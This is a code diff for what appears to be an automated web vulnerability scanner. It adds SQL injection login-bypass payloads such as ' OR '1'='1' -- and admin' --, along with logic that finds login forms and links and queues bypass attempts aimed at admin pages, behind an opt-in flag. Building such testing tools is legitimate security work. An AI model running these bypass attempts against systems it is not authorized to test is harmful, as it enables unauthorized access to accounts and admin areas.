@@ -36,6 +36,37 @@ ADMIN_QUERY_KEYS = {
 
 REFLECTION_PARAMS: tuple[str, ...] = ("q", "search", "query", "name", "message")
 
+SQLI_USERNAME_PAYLOADS: tuple[str, ...] = (
+    "' OR '1'='1' -- ",
+    "' OR 1=1 -- ",
+    "admin' -- ",
+    "' OR '1'='1'#",
+)
+
+SQLI_PASSWORD_PAYLOAD = "tinyfah-probe"
+
+LOGIN_USERNAME_HINTS: tuple[str, ...] = (
+    "username",
+    "user",
+    "email",
+    "login",
+    "userid",
+    "user_id",
+    "account",
+    "name",
+)
+
+NON_LOGIN_INPUT_TYPES = {"hidden", "submit", "button", "checkbox", "radio", "file", "image"}
+
+LOGIN_LINK_HINTS: tuple[str, ...] = (
+    "login",
+    "log-in",
+    "signin",
+    "sign-in",
+    "sign_in",
+    "auth",
+)
+
 
 def _origin(snapshot: dict, fallback: str) -> str:
     origin = str(snapshot.get("origin") or "").strip()
@@ -94,6 +125,148 @@ def _action(
 def canary_payload(run_id: str) -> str:
     digest = (run_id or "run")[:8]
     return f"<{CANARY_MARKER.lower()}-{digest}>"
+
+
+def _login_fields(form: dict) -> tuple[str, str] | None:
+    inputs = [
+        element
+        for element in form.get("inputs", [])
+        if str(element.get("name") or "").strip()
+    ]
+    password = next(
+        (element for element in inputs if str(element.get("type") or "").lower() == "password"),
+        None,
+    )
+    if not password:
+        return None
+
+    candidates = [
+        element
+        for element in inputs
+        if str(element.get("type") or "").lower() not in NON_LOGIN_INPUT_TYPES
+        and str(element.get("type") or "").lower() != "password"
+    ]
+    for element in candidates:
+        name = str(element.get("name") or "").strip().lower()
+        if any(hint in name for hint in LOGIN_USERNAME_HINTS):
+            return str(element["name"]), str(password["name"])
+
+    if candidates:
+        return str(candidates[0]["name"]), str(password["name"])
+    return None
+
+
+def _sqli_admin_target(origin: str, inventory: dict) -> str:
+    origin_host = urlsplit(origin).netloc.lower()
+    same_origin: list[str] = []
+    for hint in inventory.get("admin_hints", []):
+        href = str(hint.get("href") or "")
+        if href.startswith("http") and urlsplit(href).netloc.lower() == origin_host:
+            same_origin.append(href)
+
+    for href in same_origin:
+        path = urlsplit(href).path.lower()
+        if any(path == candidate or path.startswith(candidate + "/") for candidate in ADMIN_PATHS):
+            return href
+
+    if same_origin:
+        return same_origin[0]
+    return urljoin(origin + "/", ADMIN_PATHS[0].lstrip("/"))
+
+
+def _sqli_action(
+    *,
+    page_url: str,
+    action: str,
+    method: str,
+    username_field: str,
+    password_field: str,
+    payload: str,
+    admin_target: str,
+) -> dict:
+    login = {
+        "page_url": page_url,
+        "action": action,
+        "method": method,
+        "username_field": username_field,
+        "password_field": password_field,
+        "username_payload": payload,
+        "password_payload": SQLI_PASSWORD_PAYLOAD,
+        "admin_target": admin_target,
+    }
+    field_label = username_field or "auto-detected username"
+    return {
+        "id": _action_id(f"sqli {method} {action} {payload} {username_field}"),
+        "playbook": "sql_injection_auth_bypass",
+        "description": (
+            f"Attempt SQL injection login bypass on '{field_label}' at {action}"
+        ),
+        "method": method,
+        "target": action,
+        "page_url": page_url,
+        "params": {},
+        "tool": "browser_sql_login",
+        "verifier": "sql_injection_login",
+        "action_class": "STATE_CHANGE",
+        "login": login,
+    }
+
+
+def _sqli_candidates(origin: str, snapshot: dict, inventory: dict) -> list[dict]:
+    page_url = str(snapshot.get("url") or origin)
+    admin_target = _sqli_admin_target(origin, inventory)
+    candidates: list[dict] = []
+
+    for form in snapshot.get("forms", []):
+        fields = _login_fields(form)
+        if not fields:
+            continue
+        username_field, password_field = fields
+        action = str(form.get("action") or page_url)
+        method = str(form.get("method") or "POST").upper()
+        if method not in {"GET", "POST"}:
+            method = "POST"
+        candidates.extend(
+            _sqli_action(
+                page_url=page_url,
+                action=action,
+                method=method,
+                username_field=username_field,
+                password_field=password_field,
+                payload=payload,
+                admin_target=admin_target,
+            )
+            for payload in SQLI_USERNAME_PAYLOADS
+        )
+
+    if candidates:
+        return candidates
+
+    seen: set[str] = set()
+    for link in snapshot.get("links", []):
+        href = str(link.get("href") or "")
+        if not href.startswith("http") or href in seen:
+            continue
+        haystack = f"{href} {link.get('text') or ''}".lower()
+        if "logout" in haystack or not any(hint in haystack for hint in LOGIN_LINK_HINTS):
+            continue
+        seen.add(href)
+        candidates.extend(
+            _sqli_action(
+                page_url=href,
+                action=href,
+                method="POST",
+                username_field="",
+                password_field="",
+                payload=payload,
+                admin_target=admin_target,
+            )
+            for payload in SQLI_USERNAME_PAYLOADS
+        )
+        if len(seen) >= 2:
+            break
+
+    return candidates
 
 
 def _reflection_candidates(origin: str, snapshot: dict, canary: str) -> list[dict]:
@@ -184,9 +357,13 @@ def build_candidates(
     target_url: str,
     canary: str,
     max_actions: int = EXPLORE_MAX_ACTIONS,
+    include_sqli: bool = False,
 ) -> list[dict]:
     origin = _origin(snapshot, target_url)
     candidates: list[dict] = []
+
+    if include_sqli:
+        candidates.extend(_sqli_candidates(origin, snapshot, inventory))
 
     for path in ARTIFACT_PATHS:
         candidates.append(
@@ -214,9 +391,14 @@ def build_candidates(
     candidates.extend(_reflection_candidates(origin, snapshot, canary))
 
     deduped: list[dict] = []
-    seen: set[tuple[str, str]] = set()
+    seen: set[tuple[str, str, str]] = set()
     for candidate in candidates:
-        key = (candidate["method"], candidate["target"])
+        login = candidate.get("login") or {}
+        key = (
+            candidate["method"],
+            candidate["target"],
+            str(login.get("username_payload") or ""),
+        )
         if key in seen:
             continue
         seen.add(key)
